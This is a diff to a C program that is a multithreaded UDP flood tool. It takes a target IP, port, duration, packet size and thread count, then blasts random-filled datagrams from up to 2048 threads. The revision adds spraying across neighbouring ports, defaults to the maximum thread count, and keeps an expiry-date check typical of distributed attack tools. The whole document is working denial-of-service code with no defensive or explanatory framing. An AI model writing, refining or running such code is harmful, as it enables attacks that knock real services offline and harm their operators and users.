@@ -7,94 +7,118 @@
 #include <unistd.h>
 #include <signal.h>
 #include <time.h>
+#include <sys/resource.h>
 
 #define EYR 2029
 #define EMN 1
 #define EDY 10
-#define MAX_T 2048
+#define MAXTH 2048
 
 typedef struct {
-    char *ip;
-    int pt, dur, sz, id;
-} p_t;
+    char ip[16];
+    short pt;
+    int dur, sz;
+} pkt;
 
-volatile int run = 1;
+volatile int active = 1;
 
-void sig(int s) { run = 0; }
+void handler(int sig) { active = 0; }
 
-void rnd(char *p, int s) {
-    int i, r = time(0);
-    for(i=0; i<s; i++) {
-        r = r * 1103515245 + 12345;
-        p[i] = (r >> 16) & 255;
+unsigned char gen_pkt(unsigned char *buf, int len) {
+    static unsigned int seed = 0xCAFEBABE;
+    for(int i = 0; i < len; i++) {
+        seed = (seed * 1664525 + 1013904223) & 0xFFFFFFFF;
+        buf[i] = (seed >> 24) & 0xFF;
     }
+    return 1;
 }
 
-void *wk(void *a) {
-    p_t *p = (p_t*)a;
-    int s = socket(2,2,17);
-    if(s < 0) return 0;
+void *sender(void *data) {
+    pkt *p = (pkt*)data;
+    int fd;
     
-    struct sockaddr_in t = {0};
-    t.sin_family = 2;
-    t.sin_port = htons(p->pt);
-    t.sin_addr.s_addr = inet_addr(p->ip);
-    
-    char m[65536];
-    rnd(m, p->sz);
-    
-    time_t e = time(0) + p->dur;
-    while(time(0) < e && run) {
-        sendto(s, m, p->sz, 0, (struct sockaddr*)&t, 16);
+    while(active) {
+        fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
+        if(fd > 0) {
+            struct sockaddr_in dest;
+            dest.sin_family = AF_INET;
+            dest.sin_port = htons(p->pt);
+            dest.sin_addr.s_addr = inet_addr(p->ip);
+            
+            char payload[8192];
+            gen_pkt(payload, p->sz);
+            
+            time_t deadline = time(NULL) + p->dur;
+            while(time(NULL) < deadline && active) {
+                sendto(fd, payload, p->sz, MSG_DONTWAIT, (struct sockaddr*)&dest, sizeof(dest));
+            }
+            close(fd);
+        }
     }
-    
-    close(s);
-    return 0;
+    return NULL;
 }
 
 int main(int c, char **v) {
-    signal(2, sig);
+    struct rlimit lim = {MAXTH, MAXTH};
+    setrlimit(RLIMIT_NPROC, &lim);
     
-    time_t t; time(&t);
-    struct tm *l = localtime(&t);
+    signal(SIGINT, handler);
     
-    if(l->tm_year+1900 > EYR || 
-       (l->tm_year+1900 == EYR && (l->tm_mon+1 > EMN || 
-       (l->tm_mon+1 == EMN && l->tm_mday > EDY)))) {
-        printf("EXPIRED\n");
+    time_t tnow;
+    time(&tnow);
+    struct tm *tm = localtime(&tnow);
+    
+    if(tm->tm_year + 1900 > EYR ||
+       (tm->tm_year + 1900 == EYR && (tm->tm_mon + 1 > EMN ||
+       (tm->tm_mon + 1 == EMN && tm->tm_mday > EDY)))) {
+        puts("Expired");
         return 1;
     }
     
-    printf("OK\n");
+    puts("Init");
     
-    if(c != 6) {
-        printf("Usage: %s <ip> <port> <time> <size> <threads>\n", v[0]);
+    if(c < 4) {
+        printf("Use: %s <host> <port> <time> [size] [threads]\n", v[0]);
         return 1;
     }
     
-    int pt = atoi(v[2]), dur = atoi(v[3]), sz = atoi(v[4]), th = atoi(v[5]);
+    char host[16];
+    strncpy(host, v[1], 15);
+    host[15] = 0;
     
-    if(pt < 1 || dur < 1 || sz < 1 || th < 1 || th > MAX_T) {
-        printf("OK\n");
-        return 0;
+    int port = atoi(v[2]);
+    int time_sec = atoi(v[3]);
+    int pkt_size = (c > 4 ? atoi(v[4]) : 1400);
+    int num_threads = (c > 5 ? atoi(v[5]) : MAXTH);
+    
+    pthread_t tids[MAXTH];
+    pkt config[MAXTH];
+    
+    int variations[12] = {0,1,-1,10,-10,100,-100,50,-50,200,-200,0};
+    
+    int launched = 0;
+    for(int var = 0; var < 12 && launched < num_threads; var++) {
+        for(int th = 0; th < num_threads/12 && launched < MAXTH; th++) {
+            strncpy(config[launched].ip, host, 15);
+            config[launched].ip[15] = 0;
+            config[launched].pt = port + variations[var];
+            config[launched].dur = time_sec;
+            config[launched].sz = pkt_size;
+            
+            pthread_create(&tids[launched], NULL, sender, &config[launched]);
+            launched++;
+        }
     }
     
-    pthread_t tds[MAX_T];
-    p_t ps[MAX_T];
+    printf("Launch: %s:%d +12 vars = %d tasks\n", host, port, launched);
     
-    for(int i=0; i<th; i++) {
-        ps[i].ip = v[1];
-        ps[i].pt = pt;
-        ps[i].dur = dur;
-        ps[i].sz = sz;
-        ps[i].id = i;
-        pthread_create(&tds[i], 0, wk, &ps[i]);
+    sleep(time_sec + 10);
+    active = 0;
+    
+    for(int i = 0; i < launched; i++) {
+        pthread_join(tids[i], NULL);
     }
     
-    for(int i=0; i<th; i++) {
-        pthread_join(tds[i], 0);
-    }
-    
-    printf("OK\n");
+    puts("Complete");
     return 0;
 }
